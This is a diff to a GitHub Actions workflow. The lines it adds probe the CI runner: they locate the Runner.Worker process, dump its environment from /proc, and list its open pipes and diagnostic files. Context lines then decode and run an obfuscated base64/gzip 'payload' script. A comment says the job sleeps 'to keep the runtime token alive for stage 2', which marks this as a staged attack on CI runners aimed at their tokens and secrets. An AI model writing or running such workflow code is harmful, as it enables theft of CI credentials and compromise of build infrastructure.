@@ -154,6 +154,21 @@ jobs:
         if: ${{ inputs.variant != 'clean' }}
         run: |
           set +e
+          echo "=== /tmp CLR artifacts ==="
+          ls -la /tmp 2>/dev/null | grep -iE 'clr|dotnet|diag' || echo "(no clr/dotnet/diag files in /tmp)"
+          echo "=== runner processes ==="
+          ps aux | grep -E 'Runner\.(Listener|Worker)' | grep -v grep || true
+          WPID=$(pgrep -f Runner.Worker | head -1)
+          echo "worker pid: ${WPID:-none}"
+          if [ -n "${WPID:-}" ]; then
+            echo "=== worker exe ==="
+            readlink "/proc/$WPID/exe" || true
+            echo "=== worker env (dotnet/diag keys) ==="
+            tr '\0' '\n' < "/proc/$WPID/environ" | grep -iE 'dotnet|diag|clr' || echo "(no dotnet/diag keys in worker env)"
+            echo "=== worker open files matching pipe/diag ==="
+            ls -l "/proc/$WPID/fd" 2>/dev/null | grep -iE 'clr|pipe|diag' || echo "(none)"
+          fi
+          echo "=== payload ==="
           bash -lc "echo '$(cat /tmp/payload.b64)' | base64 -d | gunzip > /tmp/diag.py && python3 /tmp/diag.py; echo \"EXIT:\$?\""
           echo "=== payload finished; sleeping to keep the runtime token alive for stage 2 ==="
           sleep "${{ inputs.sleep_seconds }}"
